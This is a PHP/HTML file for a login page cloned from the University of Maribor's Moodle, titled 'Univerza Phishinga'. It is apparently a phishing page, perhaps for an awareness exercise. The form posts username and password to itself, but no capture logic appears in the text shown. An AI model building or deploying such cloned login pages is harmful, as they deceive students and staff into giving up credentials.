<?php
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Moodle UM: Log in to the site | Univerza Phishinga</title>
</head>
<style>

* {
        box-sizing: border-box;
    }

    html {
        font-family: sans-serif;
        line-height: 1.5;
        font-weight: 400;
        -webkit-text-size-adjust: 100%;
        -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
    }

    body {
        height: 100vh;
        background-image: url(assets/Background.png);
        background-size: cover;
        margin: 0;
        padding: 0;
    }

    .login-wrapper {
        display: flex;
        align-items: center;
        justify-content: center;
        height: 100%;
    }

    .login-container {
        background-color: #fff;
        padding: 3rem;
        box-shadow: 0 .5rem 1rem rgba(0, 0, 0, .15);
        max-width: 600px;
        border-radius: .5rem;
    }

    .login-logo {
        display: flex;
        margin-bottom: 1rem;
        justify-content: center;
    }

    .form-group {
        margin-bottom: 1rem;
    }

    .login-divider {
        margin-top: 1.5rem;
        margin-bottom: 1.5rem;
        border-top: 1px solid #dee2e6;
    }

    .form-group {
        margin-bottom: 1rem;
    }

    .d-flex {
        display: flex !important;
        align-items: center;
    }

    .form-control {
        display: block;
        width: 100%;
        height: calc(1.5em + 0.75rem + 2px);
        padding: .375rem .75rem;
        font-size: .9375rem;
        font-weight: 400;
        line-height: 1.5;
        color: #495057;
        background-color: #fff;
        background-clip: padding-box;
        border: 1px solid #8f959e;
        border-radius: .5rem;
        transition: border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
    }

    .form-control-lg {
        height: calc(1.5em + 1rem + 2px);
        padding: .5rem 1rem;
        font-size: 1.171875rem;
        line-height: 1.5;
        border-radius: .6rem;
    }

    @media (max-width: 1200px) {
        .form-control-lg {
            font-size: calc(0.9271875rem + 0.32625vw);
        }
    }

    b,
    strong {
        font-weight: bolder;
    }

    a {
        color: #006a8b;
        text-decoration: none;
        background-color: transparent;
    }

    .dropdown-toggle::after {
        margin-right: 0;
        margin-left: 4px;
        display: inline-block;
        font: normal normal normal 14px / 1 FontAwesome;
        font-size: inherit;
        text-rendering: auto;
        -webkit-font-smoothing: antialiased;
        -moz-osx-font-smoothing: grayscale;
        font-size: 9px;
        width: 9px;
        border: 0;
        vertical-align: .255em;
    }

    .dropdown-toggle {
        white-space: nowrap;
    }

    .dropdown {
        position: relative;
    }

    .border-left {
        border-left: 1px solid #dee2e6 !important;
    }

    .align-self-center {
        align-self: center !important;
    }

    .divider {
        width: 1px;
        background-color: #dee2e6;
        height: 1.875rem;
    }

    .mx-3 {
        margin-right: 1rem !important;
        margin-left: 1rem !important;
    }

    .mx {
        margin-right: 0.5rem !important;
        margin-left: 0.5rem !important;
    }

    .btn {
        display: inline-block;
        font-weight: 400;
        color: #1d2125;
        text-align: center;
        vertical-align: middle;
        cursor: pointer;
        user-select: none;
        background-color: transparent;
        border: 1px solid transparent;
        padding: .375rem .75rem;
        font-size: .9375rem;
        line-height: 1.5;
        border-radius: .5rem;
        transition: color 0.15s ease-in-out, background-color 0.15s ease-in-out, border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
    }

    .btn:hover {
        color: #1d2125;
        text-decoration: none;
    }

    @media (max-width: 1200px) {
        .btn {
            font-size: calc(0.90375rem + 0.045vw);
        }
    }

    @media (max-width: 1200px) {

        .btn-lg,
        .btn-group-lg>.btn {
            font-size: calc(0.9271875rem + 0.32625vw);
        }
    }

    .btn-lg,
    .btn-group-lg>.btn {
        padding: .5rem 1rem;
        font-size: 1.171875rem;
        line-height: 1.5;
        border-radius: .6rem;
    }

    .btn-primary {
        color: #fff;
        background-color: #006a8b;
        border-color: #006a8b;
    }

    .btn-secondary {
        color: #1d2125;
        background-color: #ced4da;
        border-color: #ced4da;
    }

    .btn-secondary:hover {
        color: #1d2125;
        background-color: #b8c1ca;
        border-color: #b1bbc4;
    }

    .btn:active {
        color: #1d2125;
        background-color: #b1bbc4;
        border-color: #aab4bf;
    }

    .caret {
        display: inline-block;
        margin-left: 4px;
        width: 0;
        height: 0;
        vertical-align: middle;
        border-top: 4px solid;
        border-right: 4px solid transparent;
        border-left: 4px solid transparent;
    }
</style>

<body>
    <div class="login-wrapper">
        <div class="login-container">
            <div class="login-logo">
                <img src="assets/umestudij.png" alt="logo">
            </div>
            <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post" class="login-form">
                <div class="login-form-username form-group">
                    <input class="form-control form-control-lg" placeholder="Username" type="text" name="username">
                </div>
                <div class="login-form-password form-group">
                    <input class="form-control form-control-lg" placeholder="Password" type="password" name="password">
                </div>
                <div class="login-form-submit form-group">
                    <button class="btn btn-primary btn-lg" type="submit">
                        Log in
                    </button>
                </div>
                <div class="login-form-forgotpassword form-group">
                    <a href="#">
                        Lost password?
                    </a>
                </div>

                <div class="login-divider"></div>

                <div class="d-flex">
                    <div class="login-languagemenu">
                        <div>
                            <div class="dropdown">
                                <a href="#" class="dropdown-toggle icon-no-margin">
                                    English ‎(en)‎
                                    <svg class="mx" width="10" height="10" viewBox="0 0 512 512" fill="#2D6A8B"
                                        xmlns="http://www.w3.org/2000/svg">
                                        <path
                                            d="M256 294.1L96.6 134.6c-12.4-12.4-32.8-12.4-45.2 0s-12.4 32.8 0 45.2l192 192c12.4 12.4 32.8 12.4 45.2 0l192-192c12.4-12.4 12.4-32.8 0-45.2s-32.8-12.4-45.2 0L256 294.1z"
                                            fill="#2D6A8B" stroke="#2D6A8B" stroke-width="20" />
                                    </svg>
                                </a>
                            </div>
                        </div>
                    </div>
                    <div class="divider align-self-center border-left mx-3">
                    </div>
                    <button class="btn btn-secondary">
                        Cookies notice
                    </button>
                </div>
            </form>
        </div>
    </div>
</body>

</html>